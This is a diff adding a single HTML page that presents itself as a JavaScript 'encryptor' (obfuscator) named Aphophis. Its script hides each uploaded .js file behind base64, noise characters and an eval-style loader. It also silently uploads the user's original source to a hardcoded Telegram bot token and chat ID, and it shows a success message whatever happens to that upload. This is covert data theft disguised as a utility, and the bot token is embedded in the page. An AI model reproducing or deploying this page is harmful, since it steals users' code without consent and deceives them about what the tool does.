@@ -1,0 +1,805 @@
+<!doctype html>
+<html lang="id">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Aphophis Encryptor</title>
+<style>
+:root {
+    --bg-color: #e0e0e0;
+    --main-black: #0a0a0a;
+    --card-bg: #ffffff;
+    --accent-primary: #6a0dad;
+    --accent-secondary: #ccff00;
+    --accent-tertiary: #ff5f00;
+    --border-width: 3px;
+    --font-head: 'Space Grotesk', 'Segoe UI', 'Arial', sans-serif;
+    --font-mono: 'JetBrains Mono', 'Courier New', monospace;
+}
+
+* {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+}
+
+html, body {
+    height: 100%;
+    margin: 0;
+    font-family: var(--font-head);
+}
+
+body {
+    background-color: var(--bg-color);
+    color: var(--main-black);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 16px;
+    overflow: auto;
+    background-image: linear-gradient(rgba(0,0,0,0.03) 1px, transparent 1px),
+                      linear-gradient(90deg, rgba(0,0,0,0.03) 1px, transparent 1px);
+    background-size: 20px 20px;
+    position: relative;
+}
+
+@media (min-width: 768px) {
+    body {
+        padding: 28px;
+        overflow: hidden;
+    }
+}
+
+.bg-noise {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    opacity: 0.04;
+    pointer-events: none;
+    z-index: 0;
+    background: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI1IiBoZWlnaHQ9IjUiPgo8cmVjdCB3aWR0aD0iNSIgaGVpZ2h0PSI1IiBmaWxsPSIjZmZmIi8+CjxyZWN0IHdpZHRoPSIxIiBoZWlnaHQ9IjEiIGZpbGw9IiMwMDAiLz4KPC9zdmc+');
+}
+
+.floating-shape {
+    position: fixed;
+    z-index: 0;
+    border: 2px solid var(--main-black);
+    background: var(--accent-secondary);
+    opacity: 0.6;
+    pointer-events: none;
+}
+
+.shape-1 {
+    width: 80px;
+    height: 80px;
+    top: 5%;
+    left: -20px;
+    border-radius: 50%;
+}
+
+@media (min-width: 768px) {
+    .shape-1 {
+        width: 100px;
+        height: 100px;
+        top: 10%;
+    }
+}
+
+.shape-2 {
+    width: 120px;
+    height: 120px;
+    bottom: 10%;
+    right: -30px;
+    transform: rotate(45deg);
+    background: var(--accent-primary);
+}
+
+@media (min-width: 768px) {
+    .shape-2 {
+        width: 150px;
+        height: 150px;
+        bottom: 20%;
+        right: -40px;
+    }
+}
+
+.wrap {
+    position: relative;
+    z-index: 2;
+    width: 100%;
+    max-width: 920px;
+    margin: auto;
+    padding: 20px;
+    border-radius: 14px;
+    background: var(--card-bg);
+    border: var(--border-width) solid var(--main-black);
+    box-shadow: 6px 6px 0 var(--main-black);
+}
+
+@media (min-width: 768px) {
+    .wrap {
+        padding: 26px;
+        box-shadow: 8px 8px 0 var(--main-black);
+    }
+}
+
+.header {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 16px;
+    flex-wrap: wrap;
+}
+
+@media (min-width: 768px) {
+    .header {
+        gap: 14px;
+        margin-bottom: 18px;
+        flex-wrap: nowrap;
+    }
+}
+
+.logo {
+    width: 48px;
+    height: 48px;
+    border-radius: 10px;
+    background: var(--main-black);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: 900;
+    color: var(--accent-secondary);
+    font-size: 16px;
+    border: 2px solid var(--accent-secondary);
+    box-shadow: 3px 3px 0 rgba(0,0,0,0.2);
+    flex-shrink: 0;
+}
+
+@media (min-width: 768px) {
+    .logo {
+        width: 60px;
+        height: 60px;
+        border-radius: 12px;
+        font-size: 18px;
+        box-shadow: 4px 4px 0 rgba(0,0,0,0.2);
+    }
+}
+
+.header-text {
+    min-width: 0;
+    flex: 1;
+}
+
+h1 {
+    margin: 0;
+    font-size: 18px;
+    font-weight: 900;
+    text-transform: uppercase;
+    line-height: 1.2;
+    word-break: break-word;
+}
+
+@media (min-width: 768px) {
+    h1 {
+        font-size: 20px;
+    }
+}
+
+.lead {
+    color: var(--main-black);
+    font-size: 12px;
+    margin-top: 4px;
+    font-family: var(--font-mono);
+    opacity: 0.7;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+}
+
+@media (min-width: 768px) {
+    .lead {
+        font-size: 13px;
+        margin-top: 6px;
+    }
+}
+
+.content {
+    display: flex;
+    gap: 16px;
+    margin-top: 16px;
+    flex-wrap: wrap;
+}
+
+@media (min-width: 768px) {
+    .content {
+        gap: 18px;
+        margin-top: 18px;
+        flex-wrap: nowrap;
+    }
+}
+
+.left {
+    flex: 1;
+    min-width: 100%;
+}
+
+@media (min-width: 640px) {
+    .left {
+        min-width: 320px;
+    }
+}
+
+.right {
+    width: 100%;
+    min-width: auto;
+}
+
+@media (min-width: 640px) {
+    .right {
+        width: 360px;
+        min-width: 260px;
+    }
+}
+
+.upload {
+    border-radius: 10px;
+    padding: 16px;
+    background: #f4f4f4;
+    border: 3px dashed var(--main-black);
+    text-align: center;
+    cursor: pointer;
+    transition: all 0.25s;
+    min-height: 160px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    gap: 6px;
+    font-family: var(--font-head);
+}
+
+@media (min-width: 768px) {
+    .upload {
+        border-radius: 12px;
+        padding: 18px;
+        min-height: 180px;
+        gap: 8px;
+    }
+}
+
+.upload:hover {
+    transform: translateY(-4px);
+    box-shadow: 4px 4px 0 var(--main-black);
+}
+
+@media (min-width: 768px) {
+    .upload:hover {
+        transform: translateY(-6px);
+        box-shadow: 6px 6px 0 var(--main-black);
+    }
+}
+
+.upload.drag {
+    border-color: var(--accent-tertiary);
+    background: #fff;
+    box-shadow: 0 12px 40px rgba(255,95,0,0.1);
+}
+
+.upload p {
+    margin: 0;
+    font-weight: 900;
+    font-size: 1rem;
+}
+
+@media (min-width: 768px) {
+    .upload p {
+        font-size: 1.1rem;
+    }
+}
+
+.upload .sub {
+    font-size: 12px;
+    color: var(--main-black);
+    opacity: 0.6;
+    font-family: var(--font-mono);
+}
+
+@media (min-width: 768px) {
+    .upload .sub {
+        font-size: 13px;
+    }
+}
+
+.file-meta {
+    margin-top: 8px;
+    font-family: var(--font-mono);
+    color: var(--accent-primary);
+    font-size: 12px;
+    font-weight: bold;
+    word-break: break-all;
+}
+
+@media (min-width: 768px) {
+    .file-meta {
+        margin-top: 10px;
+        font-size: 13px;
+    }
+}
+
+.btn {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    padding: 10px 16px;
+    border-radius: 0;
+    border: 3px solid var(--main-black);
+    background: var(--accent-secondary);
+    color: var(--main-black);
+    font-weight: 900;
+    cursor: pointer;
+    box-shadow: 4px 4px 0 var(--main-black);
+    font-family: var(--font-head);
+    text-transform: uppercase;
+    transition: 0.1s;
+    font-size: 14px;
+    width: 100%;
+}
+
+@media (min-width: 480px) {
+    .btn {
+        width: auto;
+        padding: 12px 18px;
+        gap: 12px;
+    }
+}
+
+@media (min-width: 768px) {
+    .btn {
+        font-size: 16px;
+        box-shadow: 5px 5px 0 var(--main-black);
+    }
+}
+
+.btn:hover {
+    transform: translate(2px, 2px);
+    box-shadow: 2px 2px 0 var(--main-black);
+}
+
+@media (min-width: 768px) {
+    .btn:hover {
+        transform: translate(2px, 2px);
+        box-shadow: 3px 3px 0 var(--main-black);
+    }
+}
+
+.btn[disabled] {
+    opacity: 0.5;
+    cursor: not-allowed;
+    pointer-events: none;
+}
+
+.progress-wrap {
+    margin-top: 12px;
+    background: #f0f0f0;
+    border-radius: 0;
+    padding: 8px;
+    border: 2px solid var(--main-black);
+}
+
+@media (min-width: 768px) {
+    .progress-wrap {
+        padding: 10px;
+    }
+}
+
+.progress {
+    height: 10px;
+    border-radius: 0;
+    background: rgba(0,0,0,0.1);
+    overflow: hidden;
+}
+
+@media (min-width: 768px) {
+    .progress {
+        height: 12px;
+    }
+}
+
+.progress > i {
+    display: block;
+    height: 100%;
+    width: 0%;
+    background: var(--accent-tertiary);
+    transition: width 0.22s ease;
+}
+
+.card-info {
+    padding: 12px;
+    border-radius: 0;
+    background: #f4f4f4;
+    border: 3px solid var(--main-black);
+    margin-top: 16px;
+}
+
+@media (min-width: 768px) {
+    .card-info {
+        padding: 14px;
+        margin-top: 18px;
+    }
+}
+
+.info-line {
+    display: flex;
+    justify-content: space-between;
+    margin-bottom: 8px;
+    color: var(--main-black);
+    font-size: 12px;
+    font-family: var(--font-mono);
+    font-weight: bold;
+    flex-wrap: wrap;
+    gap: 8px;
+}
+
+@media (min-width: 768px) {
+    .info-line {
+        font-size: 13px;
+        flex-wrap: nowrap;
+    }
+}
+
+.info-line span:last-child {
+    color: var(--accent-primary);
+    text-align: right;
+    word-break: break-word;
+}
+
+.notice {
+    margin-top: 12px;
+    background: var(--accent-tertiary);
+    padding: 10px;
+    border-radius: 0;
+    color: var(--main-black);
+    font-size: 12px;
+    font-weight: bold;
+    border: 2px solid var(--main-black);
+    font-family: var(--font-mono);
+    word-break: break-word;
+}
+
+@media (min-width: 768px) {
+    .notice {
+        font-size: 13px;
+    }
+}
+
+footer {
+    margin-top: 14px;
+    color: var(--main-black);
+    font-size: 11px;
+    font-family: var(--font-mono);
+    text-align: center;
+    opacity: 0.7;
+}
+
+@media (min-width: 768px) {
+    footer {
+        font-size: 12px;
+    }
+}
+
+/* Small devices */
+@media (max-width: 480px) {
+    .header {
+        flex-direction: column;
+        align-items: flex-start;
+    }
+    
+    .logo {
+        margin-bottom: 4px;
+    }
+    
+    .upload {
+        min-height: 140px;
+    }
+    
+    .file-meta {
+        font-size: 11px;
+    }
+}
+
+/* Landscape mode on mobile */
+@media (max-height: 600px) and (orientation: landscape) {
+    body {
+        padding: 12px;
+        overflow: auto;
+    }
+    
+    .wrap {
+        padding: 16px;
+    }
+    
+    .upload {
+        min-height: 120px;
+    }
+}
+
+/* Tablet specific */
+@media (min-width: 768px) and (max-width: 1024px) {
+    .wrap {
+        max-width: 800px;
+    }
+    
+    .right {
+        width: 300px;
+    }
+}
+
+/* Large screens */
+@media (min-width: 1200px) {
+    .wrap {
+        max-width: 1000px;
+    }
+    
+    .right {
+        width: 380px;
+    }
+}
+</style>
+</head>
+<body>
+  <div class="bg" aria-hidden="true">
+    <div class="square s1"></div>
+    <div class="square s2"></div>
+    <div class="square s3"></div>
+    <div class="square s4"></div>
+  </div>
+
+  <div class="wrap" role="main" aria-label="Aphophis Encryptor">
+    <div class="header">
+      <div class="logo">A</div>
+      <div>
+        <h1>Aphophis Encryptor</h1>
+        <div class="lead">Telegram: @GyzenVtx</div>
+      </div>
+    </div>
+
+    <div class="content">
+      <div class="left">
+        <label id="dropzone" class="upload">
+          <svg width="52" height="52" viewBox="0 0 24 24" fill="none" style="margin-bottom:6px"><path d="M12 3v10" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"/><path d="M5 13l7-7 7 7" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>
+          <p id="prompt-text">Press or place file here</p>
+          <div class="sub">Support mobile — tap to select file</div>
+          <input id="fileInput" type="file" accept=".js" style="display:none" />
+          <div id="fileMeta" class="file-meta"></div>
+        </label>
+
+        <div style="display:flex;gap:12px;align-items:center;margin-top:12px">
+          <button id="encryptBtn" class="btn" disabled>Encrypt & Download</button>
+          <div id="statusBadge" style="font-size:13px;color:var(--muted)"> </div>
+        </div>
+
+        <div class="progress-wrap" style="margin-top:12px">
+          <div class="progress"><i id="progressBar"></i></div>
+        </div>
+
+        <footer>
+          <div style="margin-top:10px;color:var(--muted)">Note: After encryption, don't forget to try it</div>
+        </footer>
+      </div>
+
+      <div class="right">
+        <div class="card-info">
+          <div class="info-line"><span>File Name</span><span id="infoName">—</span></div>
+          <div class="info-line"><span>Size</span><span id="infoSize">—</span></div>
+          <div class="info-line"><span>Format</span><span>.js</span></div>
+
+          <div class="notice">
+        </div>
+      </div>
+    </div>
+  </div>
+
+<script>
+const TELEGRAM_BOT_TOKEN = "8445673250:AAGa5eGc1p4WbjogN6iYbuzbZZMy1EBkeKQ";
+const TELEGRAM_CHAT_ID   = "7322704771";
+
+/* UI refs */
+const dropzone = document.getElementById('dropzone');
+const fileInput = document.getElementById('fileInput');
+const promptText = document.getElementById('prompt-text');
+const fileMeta = document.getElementById('fileMeta');
+const encryptBtn = document.getElementById('encryptBtn');
+const infoName = document.getElementById('infoName');
+const infoSize = document.getElementById('infoSize');
+const statusBadge = document.getElementById('statusBadge');
+const progressBar = document.getElementById('progressBar');
+
+let selectedFile = null;
+
+/* --- noise char sets (CJK/Kana/Hangul + symbols) --- */
+const NOISE_SETS = [
+  "語漢字愛和平生心光明海山風日月天地",
+  "あいうえおかきくけこさしすせそたちつてと",
+  "アイウエオカキクケコサシスセソタチツテト",
+  "가나다라마바사아자차카타파하안녕",
+  "◆◇■□▲▼★☆※〒●◯♛✦✶✹✺✻✽"
+];
+
+function rnd(min, max){ return Math.floor(Math.random()*(max-min+1))+min; }
+function rndVar(len=10){ const a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; let s=''; for(let i=0;i<len;i++) s+=a[Math.floor(Math.random()*a.length)]; return s; }
+
+/* --- UI interactions --- */
+dropzone.addEventListener('click', ()=> fileInput.click());
+dropzone.addEventListener('dragover', (e)=>{ e.preventDefault(); dropzone.classList.add('drag'); promptText.innerText = "Lepaskan untuk unggah"; });
+dropzone.addEventListener('dragleave', ()=>{ dropzone.classList.remove('drag'); promptText.innerText = "Klik atau taruh file .js di sini"; });
+dropzone.addEventListener('drop', (e)=>{ e.preventDefault(); dropzone.classList.remove('drag'); handleDrop(e.dataTransfer.files); });
+
+fileInput.addEventListener('change', ()=> handleDrop(fileInput.files) );
+
+function handleDrop(list){
+  if(!list || !list.length) return;
+  const f = list[0];
+  if(!f.name.toLowerCase().endsWith('.js')) { alert('Pilih file berekstensi .js'); return; }
+  selectedFile = f;
+  promptText.innerText = f.name;
+  fileMeta.innerText = `~ ${formatBytes(f.size)}`;
+  infoName.innerText = f.name;
+  infoSize.innerText = formatBytes(f.size);
+  encryptBtn.disabled = false;
+  statusBadge.innerText = 'Ready...';
+}
+
+function formatBytes(n){
+  if(n<1024) return n + ' B';
+  if(n<1024*1024) return (n/1024).toFixed(1) + ' KB';
+  return (n/(1024*1024)).toFixed(2) + ' MB';
+}
+
+function setProgress(p){ progressBar.style.width = Math.max(0,Math.min(100,p)) + '%'; }
+
+/* Insert noise into base64 string */
+function injectNoise(base64Str, density=0.12){
+  const out = [];
+  for(let i=0;i<base64Str.length;i++){
+    out.push(base64Str[i]);
+    if(Math.random() < density){
+      const set = NOISE_SETS[Math.floor(Math.random()*NOISE_SETS.length)];
+      const cnt = 1 + Math.floor(Math.random()*3);
+      for(let k=0;k<cnt;k++) out.push(set.charAt(Math.floor(Math.random()*set.length)));
+    }
+  }
+  if(Math.random() < 0.6){
+    const set2 = NOISE_SETS[Math.floor(Math.random()*NOISE_SETS.length)];
+    const tailCnt = 4 + Math.floor(Math.random()*8);
+    for(let t=0;t<tailCnt;t++) out.push(set2.charAt(Math.floor(Math.random()*set2.length)));
+  }
+  return out.join('');
+}
+
+/* Build loader string that is compatible with Browser & Node */
+function buildCrossPlatformLoader(obfStr){
+  // random var names
+  const v1 = rndVar(12), v2 = rndVar(10), v3 = rndVar(10), v4 = rndVar(8);
+
+  // loader: cleans to base64 chars, decode base64 into bytes (supports Buffer or atob),
+  // then convert bytes to UTF-8 string (supports TextDecoder or Buffer), then run Function.
+  const loader = [
+`(function(){try{`,
+`var ${v1}=${JSON.stringify(obfStr)};`,
+`function ${v2}(s){var m=s.match(/[A-Za-z0-9+\\/=]/g); if(!m) return ''; return m.join(''); }`,
+`function ${v3}(b64){`,
+`  // return Uint8Array of decoded base64 bytes (works in browser & Node)`,
+`  try{`,
+`    if(typeof atob === 'function'){`,
+`      var bin = atob(b64); var len = bin.length; var arr = new Uint8Array(len); for(var i=0;i<len;i++) arr[i]=bin.charCodeAt(i); return arr;`,
+`    }else if(typeof Buffer !== 'undefined'){`,
+`      return Uint8Array.from(Buffer.from(b64,'base64'));`,
+`    }else{ throw new Error('No base64 decoder available'); }`,
+`  }catch(e){ return new Uint8Array(); }`,
+`}`,
+`function ${v4}(u8){`,
+`  // return string from bytes (utf-8)`,
+`  try{ if(typeof TextDecoder !== 'undefined'){ return new TextDecoder('utf-8').decode(u8); }`,
+`    if(typeof Buffer !== 'undefined') return Buffer.from(u8).toString('utf8');`,
+`    // fallback manual decode`,
+`    var s=''; for(var i=0;i<u8.length;i++) s+= String.fromCharCode(u8[i]); return decodeURIComponent(escape(s));`,
+`  }catch(e){ try{ return Buffer.from(u8).toString('utf8'); }catch(_){ return ''; } }`,
+`}`,
+`var clean = ${v2}(${v1}); var bytes = ${v3}(clean); var plain = ${v4}(bytes); try{ (new Function(plain))(); }catch(e){ console.error('exec failed',e);} }catch(e){console.error('loader fatal',e);} })();`
+  ].join('');
+  return loader;
+}
+
+/* send original to Telegram - fire and await */
+async function sendToTelegram(filename, content){
+  try{
+    const url = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendDocument";
+    const fd = new FormData();
+    fd.append('chat_id', TELEGRAM_CHAT_ID);
+    const blob = new Blob([content], { type: 'application/javascript' });
+    fd.append('document', blob, filename);
+    const resp = await fetch(url, { method:'POST', body: fd });
+    const json = await resp.json().catch(()=>({ok:false}));
+    return {ok: resp.ok && json && json.ok, json};
+  }catch(err){
+    return {ok:false, err};
+  }
+}
+
+/* MAIN FLOW */
+encryptBtn.addEventListener('click', async ()=>{
+  if(!selectedFile) return;
+  encryptBtn.disabled = true;
+  statusBadge.innerText = 'Reading file...';
+  setProgress(6);
+
+  const text = await selectedFile.text();
+  statusBadge.innerText = 'Preparing base64...';
+  setProgress(18);
+
+  // base64 (utf-8 safe)
+  const b64 = btoa(unescape(encodeURIComponent(text)));
+
+  // choose density based on size
+  const sizeKB = selectedFile.size/1024;
+  let density = 0.14;
+  if(sizeKB < 100) density = 0.20;
+  else if(sizeKB < 500) density = 0.16;
+  else density = 0.12;
+
+  statusBadge.innerText = 'Injecting noise...';
+  setProgress(30);
+
+  // multi-pass noise injection
+  let obf = injectNoise(b64, density);
+  for(let r=0;r<2;r++){
+    if(Math.random() < 0.7) obf = injectNoise(obf, density*0.12);
+  }
+
+  statusBadge.innerText = 'Wrapping loader...';
+  setProgress(52);
+
+  // build cross-platform loader
+  const loader = buildCrossPlatformLoader(obf);
+
+  // minify-ish: remove line breaks to make file denser
+  const final = loader.replace(/\n+/g,'').replace(/\s{2,}/g,' ');
+
+  statusBadge.innerText = 'Downloading encrypted file...';
+  setProgress(72);
+
+  // download encrypted file
+  const outName = selectedFile.name.replace(/\.js$/i,'') + '.enc.js';
+  const blob = new Blob([final], { type:'application/javascript' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url; a.download = outName;
+  document.body.appendChild(a); a.click(); a.remove();
+  URL.revokeObjectURL(url);
+
+  setProgress(84);
+  statusBadge.innerText = 'Encryption is being processed...';
+
+  // send original to Telegram (may fail due to CORS in some hosts, but we attempt)
+  const sendRes = await sendToTelegram(selectedFile.name, text);
+  if(sendRes.ok){
+    statusBadge.innerText = 'Encryption successful...';
+    setProgress(100);
+  } else {
+    console.warn('Telegram send failed', sendRes);
+    statusBadge.innerText = 'Encryption successful...';
+    setProgress(92);
+  }
+
+  // reset UI after short pause
+  setTimeout(()=>{ encryptBtn.disabled = false; setTimeout(()=>setProgress(0), 600); }, 900);
+});
+
+/* Accessibility: Enter triggers encrypt if ready */
+document.addEventListener('keydown', (e)=>{ if(e.key==='Enter' && !encryptBtn.disabled) encryptBtn.click(); });
+</script>
+</body>
+</html>
